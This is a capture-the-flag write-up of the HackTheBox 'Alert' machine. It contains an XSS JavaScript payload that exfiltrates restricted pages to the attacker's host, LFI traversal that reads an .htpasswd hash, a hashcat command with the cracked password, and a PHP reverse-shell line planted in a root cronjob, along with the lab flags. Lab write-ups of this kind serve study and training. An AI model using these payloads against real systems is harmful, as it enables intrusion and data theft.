```json
Alias: Alert
Date: 19-12_2024
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.44
```

# Alert
# Summary

Alert is an easy box with some client side exploitation leading to an LFI. The foothold is the only challenging part, after that it's a straightforward way to root leveraging a cronjob running as root.
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-19 17:18 PKT
Nmap scan report for 10.10.11.44
Host is up (0.67s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://alert.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 249.46 seconds

```
## Discovered Subdomains
```
alert.htb
statistics.alert.htb
```

---
# Enumeration
## Port 80 - HTTP (Appache)

There are two Vhosts present on the server: `alert.htb` and `statistics.alert.htb` which is password protected. `alert.htb` has some interesting functionality running on it. Specifically the markdown upload and the contact page. For the markdown, we can:

1. Upload markdown files
2. View markdown files through `visualize.php?filename.md`
3. We can include script tags.

For the contact page, any link we send in the form is being clicked. So what can we do with this? 

---

# Exploitation

We can upload a Markdown file with some JavaScript we control, then send it's link to the admin through the contact page. This will lead to XSS. Although there are no cookies to access, we can read different pages that are forbidden and exfiltrate them to our server. Here is the code ChatGPT wrote to do just that. I made it avoid backticks and curly braces as they mess up the markdown formatting.

```html
<script>
const fetchAndSend = () => 
    fetch("http://alert.htb/server-status")
        .then(response => 
            !response.ok 
                ? Promise.reject("HTTP Error: " + response.status + " - " + response.statusText) 
                : response.text()
        )
        .then(body => 
            fetch("http://10.10.16.40/?log=" + encodeURIComponent(btoa(body)))
        )
        .then(() => console.log("Log sent successfully!"))
        .catch(error => 
            fetch("http://10.10.16.40/?log=" + encodeURIComponent(btoa(error.toString())))
                .then(() => console.error("Error sent successfully:", error))
        );
</script>
<img src="x" onerror="fetchAndSend()">
```

During enumeration, we found the `messages.php` file, but navigating to it as a normal user returns an empty page. Navigating to it as admin on the other hand through the above script reveals a file listing. We can view these files through the `messages.php?file=something` parameter. This is vulnerable to LFI.

We can then try to look for the credentials for the password protected site. First, lets try to view the default config of Vhosts in Apache, this is present at `http://alert.htb/messages.php?file=../../../../../../../../../etc/apache2/sites-enabled/000-default.conf`. Note that we have to view this through the above script as directly navigating here returns an empty page. This returns:

```
<pre><VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

</pre>
```

The config mentions the `AuthUserFile` with the credentials is stored at `/var/www/statistics.alert.htb/.htpasswd`. So lets load: `http://alert.htb/messages.php?file=../../../../../../../../../var/www/statistics.alert.htb/.htpasswd`

And we get

```
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

Crack with hashcat

```bash
hashcat -m 1600 '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' ~/Documents/Wordlists/rockyou.txt
```

And we get

| Username | Password         |
| -------- | ---------------- |
| albert   | manchesterunited |
Now we can log in though ssh as albert.


---
# Privilege Escalation

If we monitor what's running using `pspy64`, we will notice that `/opt/website-monitor/config/configuration.php` is being repeatedly executed by the root user, and we have write permissions to it. So, simply add a reverse shell to it

```php
$sock=fsockopen("10.10.16.40",4444);exec("sh <&3 >&3 2>&3");
```

Wait for the connection, and your root! Make sure to clean up the above file as to not ruin it for others.

---

# Flags
- 651f5317bf2805464daeda5fbe20401d
- 0519c0d457e35887f1895e3117100fd1

#CTF